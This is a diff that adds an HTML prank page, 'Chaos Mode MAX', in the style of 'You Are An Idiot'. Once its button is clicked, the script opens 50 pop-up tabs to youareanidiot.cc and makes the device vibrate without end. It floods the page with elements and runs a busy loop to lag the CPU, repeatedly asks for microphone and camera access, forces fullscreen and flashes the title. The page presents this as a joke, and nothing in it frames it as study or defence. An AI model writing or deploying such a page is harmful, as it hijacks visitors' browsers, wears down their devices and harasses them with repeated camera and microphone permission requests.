@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>😈 Chaos Mode MAX</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: red;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    #start {
+      margin-top: 40vh;
+      font-size: 24px;
+      padding: 20px;
+      background: red;
+      border: none;
+      color: white;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h1>😈 YOU ARE AN IDIOT 😈</h1>
+  <button id="start">LAUNCH FULL CHAOS</button>
+  <audio id="idiotAudio" loop>
+    <source src="https://archive.org/download/youareanidiotdotorg/yai.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    const startBtn = document.getElementById("start");
+    const audio = document.getElementById("idiotAudio");
+
+    startBtn.onclick = () => {
+      startBtn.remove();
+
+      // 🔊 Audio Workaround
+      audio.play().catch(() => {
+        const retryBtn = document.createElement("button");
+        retryBtn.innerText = "Tap to enable sound";
+        retryBtn.onclick = () => audio.play();
+        document.body.appendChild(retryBtn);
+      });
+
+      // 📳 Infinite Vibration
+      if (navigator.vibrate) {
+        setInterval(() => {
+          navigator.vibrate([300, 100, 300, 100, 300]);
+        }, 100);
+      }
+
+      // 📑 Extreme Tab Spam (100+)
+      for (let i = 0; i < 50; i++) {
+        const win = window.open("https://youareanidiot.cc", "_blank");
+        if (win) win.blur();
+      }
+
+      // 🧠 CPU Lag from DOM & Math
+      setInterval(() => {
+        for (let i = 0; i < 200; i++) {
+          const div = document.createElement("div");
+          div.style.position = "absolute";
+          div.style.left = Math.random() * window.innerWidth + "px";
+          div.style.top = Math.random() * window.innerHeight + "px";
+          div.style.color = "white";
+          div.innerText = "YOU ARE AN IDIOT";
+          div.style.fontSize = "18px";
+          document.body.appendChild(div);
+        }
+        for (let j = 0; j < 100000; j++) {
+          Math.sqrt(Math.random() * 99999);
+        }
+      }, 100);
+
+      // 🎤 Request mic/camera/fullscreen over and over
+      setInterval(() => {
+        // Mic/Camera permissions
+        navigator.mediaDevices?.getUserMedia({ audio: true, video: true }).catch(() => {});
+        // Fullscreen permission
+        if (document.fullscreenEnabled) {
+          document.body.requestFullscreen().catch(() => {});
+        }
+      }, 1500);
+
+      // 🌀 Optional: Flashing title
+      setInterval(() => {
+        document.title = document.title === "😈 YOU ARE AN IDIOT" ? "😂 LOL" : "😈 YOU ARE AN IDIOT";
+      }, 500);
+    };
+  </script>
+</body>
+</html>
